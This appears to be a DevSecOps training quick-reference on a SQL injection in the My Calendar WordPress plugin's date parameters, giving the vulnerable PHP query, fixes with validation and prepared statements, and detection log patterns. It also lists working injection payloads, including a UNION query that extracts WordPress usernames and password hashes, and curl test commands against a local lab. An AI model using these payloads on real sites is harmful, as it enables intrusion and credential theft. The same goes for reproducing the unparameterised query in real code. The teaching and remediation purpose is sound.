# SQL Injection in My Calendar Plugin - Quick Reference

## For DevSecOps Educational Training

### Vulnerability Summary

**Plugin:** My Calendar WordPress Plugin  
**Affected Function:** `my_calendar_get_events()` in `my-calendar-events.php`  
**Vulnerable Parameters:** `from` and `to` date parameters  
**Severity:** Critical (CVSS 9.8)  

### The Issue

The `from` and `to` parameters are concatenated directly into SQL queries without using prepared statements:

```php
// VULNERABLE CODE (Lines ~200-210 in my-calendar-events.php)
$from = isset( $args['from'] ) ? $args['from'] : '';
$to = isset( $args['to'] ) ? $args['to'] : '';

$event_query = "
    SELECT * FROM {$table}
    WHERE DATE(occur_begin) BETWEEN '$from 00:00:00' AND '$to 23:59:59'
";
```

### Example Exploit Payloads (Educational Only)

```bash
# 1. Basic SQLi test - Single quote
http://localhost:8080/?rest_route=/my-calendar/v1/events&from=2025-01-01'

# 2. Union-based injection
from=2025-01-01' UNION SELECT NULL,NULL,user_login,user_pass FROM wp_users--

# 3. Time-based blind
from=2025-01-01' AND (SELECT SLEEP(5))--

# 4. Boolean-based
from=2025-01-01' OR 1=1--
```

### Quick Fix (Immediate Mitigation)

Add strict validation in `my-calendar-events.php` around line 112:

```php
function my_calendar_get_events( $args ) {
    $from = isset( $args['from'] ) ? $args['from'] : '';
    $to = isset( $args['to'] ) ? $args['to'] : '';
    
    // ADD THIS VALIDATION
    if ( ! preg_match( '/^\d{4}-\d{2}-\d{2}$/', $from ) || 
         ! preg_match( '/^\d{4}-\d{2}-\d{2}$/', $to ) ) {
        return array(); // Invalid format, return empty
    }
    
    // Rest of function...
}
```

### Proper Fix (Use Prepared Statements)

Use WordPress `$wpdb->prepare()`:

```php
global $wpdb;

$event_query = $wpdb->prepare( "
    SELECT * FROM {$table}
    WHERE DATE(occur_begin) BETWEEN %s AND %s
",
    $from . ' 00:00:00',
    $to . ' 23:59:59'
);
```

### Testing Commands

```bash
# Test normal request
curl "http://localhost:8080/?rest_route=/my-calendar/v1/events&from=2025-01-01&to=2025-01-31"

# Test with SQLi payload
curl "http://localhost:8080/?rest_route=/my-calendar/v1/events&from=2025-01-01'%20OR%201=1--&to=2025-01-31"

# Check logs
docker-compose exec wordpress tail -f /var/www/html/wp-content/debug.log
```

### Detection

Look for these patterns in error logs:
```
SQL syntax error
near "' OR 1=1"
You have an error in your SQL syntax
```

### Documents Created

1. **SECURITY_ANALYSIS.md** - Detailed vulnerability analysis and remediation guide
2. **DEVSECOPS_LAB_EXERCISE.md** - Hands-on lab exercises with step-by-step instructions
3. **README_SECURITY.md** - This quick reference guide

### Key Takeaways for DevSecOps

1. ✅ **Always use prepared statements** for SQL queries
2. ✅ **Validate and sanitize all user input** before database operations
3. ✅ **Never trust user input**, even if it seems safe
4. ✅ **Implement defense in depth** - multiple layers of protection
5. ✅ **Log security events** for monitoring and incident response
6. ✅ **Test regularly** with security tools and manual reviews

### Related Files in Codebase

```
wp-content/plugins/my-calendar/
├── my-calendar-api.php (Line 647 - REST endpoint)
├── my-calendar-events.php (Lines 111-250 - Vulnerable function)
└── my-calendar-core.php (Plugin initialization)
```

### Next Steps for Your Training

1. Review the detailed analysis in `SECURITY_ANALYSIS.md`
2. Complete the hands-on exercises in `DEVSECOPS_LAB_EXERCISE.md`
3. Implement the security fixes
4. Test your implementation
5. Document your findings

### Important Reminder

⚠️ **USE ONLY IN YOUR LOCAL LAB ENVIRONMENT**

This information is for educational purposes in a DevSecOps training context. Never test security vulnerabilities on systems you don't own or don't have explicit permission to test.

---

**Training Context:** Development, Security and Operations (DevSecOps) Course  
**Date:** October 6, 2025  
**Environment:** Local Docker WordPress instance at localhost:8080
